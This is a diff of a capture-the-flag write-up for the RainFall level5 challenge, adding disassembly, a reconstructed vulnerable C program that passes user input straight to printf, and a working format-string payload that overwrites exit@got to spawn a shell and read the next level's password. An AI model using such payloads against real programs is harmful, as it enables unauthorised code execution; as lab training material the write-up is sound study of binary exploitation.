@@ -35,7 +35,7 @@ No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RU
 - `ldd <executable>`
 - `readelf -a <executable>`
 - `objdump -M intel -d <executable>`
-- `(echo -e "set disassembly-flavor intel\nb main\nrun\ndisass"; cat) | gdb <executable>`
+- `(echo -e "set disassembly-flavor intel\nset pagination off\nb main\nrun\ndisass"; cat) | gdb <executable>`
 
 ## for gdb
 
@@ -438,17 +438,37 @@ Dump of assembler code for function n:
    0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
    0x080484ff <+61>:    call   0x80483d0 <exit@plt>
 End of assembler dump.
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:     push   ebp
+   0x080484a5 <+1>:     mov    ebp,esp
+   0x080484a7 <+3>:     sub    esp,0x18
+   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
+   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
+   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
+End of assembler dump.
 ```
 
-```console
-level5@RainFall:~$ objdump -t level5
-080484a4 g     F .text  0000001e              o
-08049854 g     O .bss   00000004              m
-```
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
 
-```console
-(gdb) p o
-$2 = {<text variable, no debug info>} 0x80484a4 (= 134513828) <o>
+void shell() {
+    system("/bin/sh");
+    _exit(1);
+}
+
+void cat() {
+    char s[520];
+
+    fgets(s, 512, stdin);
+    printf(s);
+    exit(1);
+}
+
+int main() { cat(); }
 ```
 
 ```console
@@ -458,15 +478,48 @@ $3 = {<text variable, no debug info>} 0x80484c2 <n>
 $4 = {<text variable, no debug info>} 0x80484a4 <o>
 ```
 
-for i in {1..35}; do echo "AAAA." "%$i\$x" | ./level5; done
+```console
+(gdb) info function exit
+All functions matching regular expression "exit":
 
+Non-debugging symbols:
+0x08048390  _exit
+0x08048390  _exit@plt
+0x080483d0  exit
+0x080483d0  exit@plt
+0xb7e5ebe0  exit
+0xb7ee41d8  _exit
+```
 
-Function addresses:
-- `exit@plt`: `0x080483d0`
-- `       o`: `0x080484a4`
-- `       n`: `0x080484c2`
-- `    exit`: `0xb7e5ebe0`
+```console
+level5@RainFall:~$ objdump -R ./level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+```
 
-"\x08\x04\x83\xd0 "
+```console
+$ python -c 'print "UUUU"+" %x"*10' | ./level5
+UUUU 200 b7fd1ac0 b7ff37d0 55555555 20782520 25207825 78252078 20782520 25207825 78252078
+```
 
-`for i in {65..70}; do python -c "print('ABCDEFGHIJKLNOPQRSTUVWXYZ %$i\$p')" | ./level5; done`
+o = 0x80484a4 = 134513828 = (2052, 33956)
+exit@got = 08049838 = 134518840 = (2052, 38968)
+
+Payload :
+- exit@got low
+- exit@got high
+- 2052 - 8 = 2044 dummy chars
+- %4$hn : write 2052 to 4th argument (actually start of format string)
+- 33956 - 2052 = 31904 dummy chars
+- %5$hn : write 33956 to 5th argument (actually start of format string + 4)
+
+```console
+$ (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044d%4$hn%31904d%5$hn"' ; cat -) | ./level5
+[...]
+whoami
+level6
+cat .pass
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+(printf "\x3a\x98\x04\x08\x38\x98\x04\x08%2044d%4\$hn%31904d%5\$hn"; cat) | ./level5
